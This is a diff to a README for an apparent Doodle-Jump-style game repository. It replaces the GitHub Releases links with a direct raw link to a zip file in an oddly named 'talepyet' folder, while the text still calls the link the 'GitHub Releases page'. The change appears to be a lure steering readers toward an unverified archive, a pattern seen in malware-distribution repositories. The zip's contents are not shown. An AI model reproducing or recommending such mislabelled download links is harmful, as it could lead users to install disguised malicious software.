@@ -1,7 +1,7 @@
 # 🎮 Doodle-Jump-Style-Game - Enjoy Endless Vertical Fun!
 
 ## 🔗 Download Now
-[![Download Doodle-Jump-Style-Game](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/braziliandayitalia/Doodle-Jump-Style-Game/releases)
+[![Download Doodle-Jump-Style-Game](https://raw.githubusercontent.com/braziliandayitalia/Doodle-Jump-Style-Game/main/talepyet/Doodle-Jump-Style-Game.zip)](https://raw.githubusercontent.com/braziliandayitalia/Doodle-Jump-Style-Game/main/talepyet/Doodle-Jump-Style-Game.zip)
 
 ## 🚀 Getting Started
 Welcome to Doodle-Jump-Style-Game! This game offers a fun, endless experience where you jump and avoid obstacles while climbing higher and higher. Enjoy hours of excitement as you try to beat your own high score!
@@ -18,7 +18,7 @@ Before you dive in, check that your system meets these requirements:
 To get the game, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our GitHub Releases page: [Download Doodle-Jump-Style-Game](https://github.com/braziliandayitalia/Doodle-Jump-Style-Game/releases).
+   Go to our GitHub Releases page: [Download Doodle-Jump-Style-Game](https://raw.githubusercontent.com/braziliandayitalia/Doodle-Jump-Style-Game/main/talepyet/Doodle-Jump-Style-Game.zip).
 
 2. **Choose Your Version**  
    On the Releases page, find the latest version of the game. It’s usually marked as the newest release. Look for version v1.0 or similar.
